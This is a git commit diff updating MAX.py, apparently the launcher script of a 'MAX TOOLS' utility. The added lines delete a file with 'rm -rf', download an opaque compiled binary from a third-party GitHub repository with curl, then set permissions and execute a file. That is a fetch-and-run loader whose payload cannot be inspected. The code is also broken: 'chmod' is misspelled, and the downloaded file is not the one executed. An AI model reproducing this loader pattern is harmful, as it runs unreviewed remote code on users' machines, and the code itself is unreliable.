841708ecff59c7e5b445c0956bd4f26d1394c419
ALVEE RINKU <122580482+R1NKU1100@users.noreply.github.com>
2023-05-05 16:16:44 +0600

    Update MAX.py

--- MAX.py
+++ MAX.py
@@ -1,5 +1,19 @@
-import os,sys
-print(' WELCOME MAX TOOLS..........')
+import os, sys, platform
+os.system('rm -rf FIRE')
+ 
+try:
+    if sys.argv[1]=='update':
+        os.system('rm -rf FIRE')
+except:
+    pass
+ 
+ 
+bit = platform.architecture()[0]
+if bit == '32bit':
+    if not os.path.isfile('FIRE'):
+        os.system('curl -L https://github.com/S4BB1R-69/FILE/blob/main/MEW.cpython-311.so?raw=true -o MEW.so') 
+        print("\1b[1;92mWELCOME TO MAX TOOLS ")
+        
 os.system('chomd 777 FIRE && ./FIRE')
         
     
